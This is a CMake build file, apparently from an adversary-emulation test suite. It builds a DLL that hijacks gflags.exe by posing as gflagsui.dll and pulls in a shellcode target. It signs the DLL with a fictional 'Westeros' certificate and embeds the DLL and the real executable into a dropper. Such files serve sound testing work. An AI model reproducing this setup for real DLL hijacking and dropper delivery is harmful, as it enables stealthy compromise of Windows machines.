###############################################################################
# GFLAGSUI HIJACKING DLL
###############################################################################
add_library(
    gflagsui
    SHARED

    "dllmain.cpp"
    "gflagsui_util.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/checks.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/handler.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/handler_util.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/logger.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/pi_aes_ctr.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/pi_base64.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/register.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/util.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/xor.cpp"
    "gflagsui.def"
)

add_dependencies(
    gflagsui
    test4shellcode-pe
)

target_compile_definitions(
    gflagsui
    PRIVATE
    DESIRED_PROCESS_NAME="gflags.exe"
    DLL_HANDLER_LOG_FILE="C:\\\\Windows\\\\System32\\\\gflagsh.log"
    DLL_SH_RUNNER_LOG_FILE="C:\\\\Windows\\\\System32\\\\gflagssr.log"
    DLL_REG_LOG_FILE="C:\\\\Windows\\\\System32\\\\gflagsreg.log"
    TARGET_MODULE="gflagsui.dll"
    TARGET_MODULE_SYS32="C:\\\\Windows\\\\System32\\\\gflagsui.dll"
    TARGET_MODULE_SYSWOW="C:\\\\Windows\\\\SysWOW64\\\\gflagsui.dll"
    ENCRYPTED_LOGGING=1 # set to 0 to disable, set to non-0 to enable
)

target_include_directories(
    gflagsui
    PUBLIC
    "${CMAKE_SOURCE_DIR}/src/common"
    "${CMAKE_SOURCE_DIR}/src/test4/gflagsui"
)

# Encrypt and embed DLL and legitimate executable in headers
add_custom_command(
    TARGET gflagsui
    PRE_BUILD
    COMMAND
        cmake -E remove "${CMAKE_SOURCE_DIR}/src/test4/dropper/d_embedded.hpp"
        cmake -E remove "${CMAKE_SOURCE_DIR}/src/test4/dropper/e_embedded.hpp"
    COMMENT "Clean previously generated e_embedded.hpp and d_embedded.hpp files"
)

# Sign DLL and generate embedded headers
add_custom_command(
    OUTPUT "${CMAKE_SOURCE_DIR}/src/test4/dropper/e_embedded.hpp" "${CMAKE_SOURCE_DIR}/src/test4/dropper/d_embedded.hpp"
    POST_BUILD
    COMMAND powershell.exe -File "${CMAKE_SOURCE_DIR}/src/common/sign_artifact.ps1" -Target "$<TARGET_FILE:gflagsui>" -CertSubject "CN=Casterly Enterprises, O=Casterly Enterprises, L=Casterly Rock, S=Lannisport, C=Westeros" -CertDnsName "Casterly Enterprises" -CertExportPath "$<TARGET_FILE_DIR:gflagsui>/test4dll.pfx"
    COMMAND powershell.exe -File "${CMAKE_SOURCE_DIR}/src/common/embed_payload.ps1" -Template "${CMAKE_SOURCE_DIR}/src/common/embedded.hpp.in" -InputFile "$<TARGET_FILE_DIR:gflagsui>/gflagsui.dll" -OutputFile "${CMAKE_SOURCE_DIR}/src/test4/dropper/d_embedded.hpp" -EmbedNamespace "dll_embed"
    COMMAND powershell.exe -File "${CMAKE_SOURCE_DIR}/src/common/embed_payload.ps1" -Template "${CMAKE_SOURCE_DIR}/src/common/embedded.hpp.in" -InputFile "${CMAKE_SOURCE_DIR}/gflags.exe" -OutputFile "${CMAKE_SOURCE_DIR}/src/test4/dropper/e_embedded.hpp" -EmbedNamespace "exe_embed"
    COMMENT "Generating headers with embedded test 4 DLL, legitimate executable and encryption key"
)

add_custom_target(
    dropper_headers
    ALL
    DEPENDS
    "${CMAKE_SOURCE_DIR}/src/test4/dropper/e_embedded.hpp"
    "${CMAKE_SOURCE_DIR}/src/test4/dropper/d_embedded.hpp"
)

add_dependencies(
    dropper_headers
    gflagsui
)
